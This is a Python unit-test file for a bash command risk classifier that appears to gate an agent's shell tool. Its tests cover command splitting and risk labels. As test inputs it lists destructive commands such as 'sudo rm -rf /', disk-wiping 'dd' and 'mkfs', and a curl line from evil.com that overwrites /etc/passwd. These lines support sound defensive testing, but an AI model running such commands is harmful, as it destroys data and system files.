# -*- coding: utf-8 -*-
"""
Unit tests for bash command risk evaluation and command splitting.
Run with: python -m unittest test.bash_risk_test
"""
import sys
import os
import unittest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from src.constants import *
from src.tool.bash_support import split_commands, get_bash_risk


class TestSplitCommands(unittest.TestCase):
    def test_simple(self):
        self.assertEqual(split_commands("ls -la"), ["ls -la"])

    def test_pipe(self):
        self.assertEqual(split_commands("cat a.txt | grep foo"), ["cat a.txt", "grep foo"])

    def test_double_pipe(self):
        self.assertEqual(split_commands("cmd1 || cmd2"), ["cmd1", "cmd2"])

    def test_and_chain(self):
        self.assertEqual(split_commands("cd /tmp && ls"), ["cd /tmp", "ls"])

    def test_semicolon(self):
        self.assertEqual(split_commands("cmd1; cmd2"), ["cmd1", "cmd2"])

    def test_background(self):
        self.assertEqual(split_commands("cmd1 & cmd2"), ["cmd1", "cmd2"])

    def test_empty(self):
        self.assertEqual(split_commands("  "), [])

    def test_quoted_separator(self):
        # shlex strips quotes during tokenization
        self.assertEqual(split_commands('echo "hello | world"'), ['echo hello | world'])

    def test_redirect_kept(self):
        self.assertEqual(split_commands("sort > out.txt"), ["sort > out.txt"])

    def test_append_redirect(self):
        self.assertEqual(split_commands("grep error < log.txt >> errors.log"),
                         ["grep error < log.txt >> errors.log"])


class TestRiskEmpty(unittest.TestCase):
    def test_empty_str(self):
        risk, reason, level = get_bash_risk("")
        self.assertEqual(risk, BASH_EMPTY_LABEL)
        self.assertEqual(level, 9)

    def test_none(self):
        risk, _, _ = get_bash_risk(None)
        self.assertEqual(risk, BASH_EMPTY_LABEL)

    def test_whitespace(self):
        risk, _, _ = get_bash_risk("  ")
        self.assertEqual(risk, BASH_EMPTY_LABEL)

    def test_unclassified(self):
        risk, _, _ = get_bash_risk("xyzzy_not_a_command")
        self.assertEqual(risk, BASH_UNKNOWN_LABEL)


class TestRiskHigh(unittest.TestCase):
    def test_sudo(self): self.assertEqual(get_bash_risk("sudo rm -rf /")[0], BASH_HIGH_RISK_LABEL)
    def test_chmod(self): self.assertEqual(get_bash_risk("chmod 777 file")[0], BASH_HIGH_RISK_LABEL)
    def test_dd(self): self.assertEqual(get_bash_risk("dd if=/dev/sda of=/dev/sdb")[0], BASH_HIGH_RISK_LABEL)
    def test_mkfs(self): self.assertEqual(get_bash_risk("mkfs.ext4 /dev/sda1")[0], BASH_HIGH_RISK_LABEL)
    def test_iptables(self): self.assertEqual(get_bash_risk("iptables -A INPUT")[0], BASH_HIGH_RISK_LABEL)
    def test_systemctl(self): self.assertEqual(get_bash_risk("systemctl stop nginx")[0], BASH_HIGH_RISK_LABEL)
    def test_docker_rm(self): self.assertEqual(get_bash_risk("docker rm mycontainer")[0], BASH_HIGH_RISK_LABEL)
    def test_reboot(self): self.assertEqual(get_bash_risk("reboot")[0], BASH_HIGH_RISK_LABEL)
    def test_shutdown(self): self.assertEqual(get_bash_risk("shutdown -h now")[0], BASH_HIGH_RISK_LABEL)
    def test_mount(self): self.assertEqual(get_bash_risk("mount /dev/sda1 /mnt")[0], BASH_HIGH_RISK_LABEL)
    def test_curl_write_root(self): self.assertEqual(get_bash_risk("curl -o /etc/passwd http://evil.com")[0], BASH_HIGH_RISK_LABEL)


class TestRiskMid(unittest.TestCase):
    def test_apt_install(self): self.assertEqual(get_bash_risk("apt install nginx")[0], BASH_PACKAGE_LABEL)
    def test_pip_install(self): self.assertEqual(get_bash_risk("pip install requests")[0], BASH_PACKAGE_LABEL)
    def test_pip_user(self): self.assertEqual(get_bash_risk("pip install --user pkg")[0], BASH_PACKAGE_LABEL)
    def test_apt_list_safe(self): self.assertEqual(get_bash_risk("apt list --installed")[0], BASH_SAFE_LABEL)
    def test_curl(self): self.assertEqual(get_bash_risk("curl google.com")[0], BASH_NETWORK_LABEL)
    def test_wget(self): self.assertEqual(get_bash_risk("wget google.com")[0], BASH_NETWORK_LABEL)
    def test_mkdir(self): self.assertEqual(get_bash_risk("mkdir newdir")[0], BASH_FILE_LABEL)
    def test_touch(self): self.assertEqual(get_bash_risk("touch newfile.txt")[0], BASH_FILE_LABEL)
    def test_cp(self): self.assertEqual(get_bash_risk("cp a.txt b.txt")[0], BASH_FILE_LABEL)
    def test_mv(self): self.assertEqual(get_bash_risk("mv a.txt b.txt")[0], BASH_FILE_LABEL)
    def test_rm(self): self.assertEqual(get_bash_risk("rm old.txt")[0], BASH_REMOVAL_LABEL)
    def test_rmdir(self): self.assertEqual(get_bash_risk("rmdir emptydir")[0], BASH_REMOVAL_LABEL)
    def test_chown(self): self.assertEqual(get_bash_risk("chown user:group file")[0], BASH_CHOWN_LABEL)


class TestRiskGit(unittest.TestCase):
    def test_log(self): self.assertEqual(get_bash_risk("git log --oneline -3")[0], BASH_SAFE_LABEL)
    def test_status(self): self.assertEqual(get_bash_risk("git status")[0], BASH_SAFE_LABEL)
    def test_diff(self): self.assertEqual(get_bash_risk("git diff")[0], BASH_SAFE_LABEL)
    def test_push(self): self.assertEqual(get_bash_risk("git push origin main")[0], BASH_REPOSITORY_MODIFY_LABEL)
    def test_commit(self): self.assertEqual(get_bash_risk("git commit -m 'msg'")[0], BASH_REPOSITORY_MODIFY_LABEL)
    def test_merge(self): self.assertEqual(get_bash_risk("git merge feature")[0], BASH_REPOSITORY_MODIFY_LABEL)
    def test_add(self): self.assertEqual(get_bash_risk("git add .")[0], BASH_STAGE_CHANGE_LABEL)
    def test_stash(self): self.assertEqual(get_bash_risk("git stash")[0], BASH_STAGE_CHANGE_LABEL)


class TestRiskSafe(unittest.TestCase):
    safe_cmds = [
        "ls -la", "cat file.txt", "head -5 file.txt", "tail -20 log.txt",
        "grep pattern file.txt", "rg pattern ./src", "find . -name '*.py'",
        "wc -l file.txt", "pwd", "whoami", "date", "uname -a",
        "df -h", "du -sh .", "echo hello", "which python", "man ls",
        "sort file.txt", "uniq file.txt", "diff a.txt b.txt",
        "ps aux", "ping -c 1 google.com", "nslookup google.com",
        "tar -tf archive.tar", "tar -czf out.tar.gz ./dir",
        "gzip -d file.gz", "unzip archive.zip",
        "jq '.key' data.json", "sed 's/old/new/g' file.txt",
        "awk '{print $1}' file.txt", "sleep 1", "timeout 5 cmd",
        "env", "printenv PATH", "stat file.txt", "file file.txt",
        "md5sum file.txt", "sha256sum file.txt", "cksum file.txt",
        "tac file.txt", "column -t file.txt", "iconv -f utf-8 -t gbk file.txt",
    ]

    def test_all_safe(self):
        for cmd in self.safe_cmds:
            with self.subTest(cmd=cmd):
                risk, _, _ = get_bash_risk(cmd)
                self.assertEqual(risk, BASH_SAFE_LABEL, f"cmd={cmd}")


class TestRiskNewSafe(unittest.TestCase):
    def test_cd(self): self.assertEqual(get_bash_risk("cd C:/Users/admin/Desktop")[0], BASH_SAFE_LABEL)
    def test_pushd(self): self.assertEqual(get_bash_risk("pushd /tmp")[0], BASH_SAFE_LABEL)
    def test_popd(self): self.assertEqual(get_bash_risk("popd")[0], BASH_SAFE_LABEL)
    def test_dirs(self): self.assertEqual(get_bash_risk("dirs")[0], BASH_SAFE_LABEL)


class TestRiskDocker(unittest.TestCase):
    def test_ps(self): self.assertEqual(get_bash_risk("docker ps")[0], BASH_SAFE_LABEL)
    def test_logs(self): self.assertEqual(get_bash_risk("docker logs mycontainer")[0], BASH_SAFE_LABEL)
    def test_run(self): self.assertEqual(get_bash_risk("docker run nginx")[0], BASH_FILE_LABEL)
    def test_build(self): self.assertEqual(get_bash_risk("docker build -t img .")[0], BASH_FILE_LABEL)


class TestRiskBuild(unittest.TestCase):
    def test_make(self): self.assertEqual(get_bash_risk("make")[0], BASH_FILE_LABEL)
    def test_gcc(self): self.assertEqual(get_bash_risk("gcc -o out in.c")[0], BASH_FILE_LABEL)

    def test_script(self):
        risk, _, _ = get_bash_risk("./script.sh")
        self.assertEqual(risk, BASH_UNKNOWN_LABEL)  # not in safe list


if __name__ == "__main__":
    unittest.main()
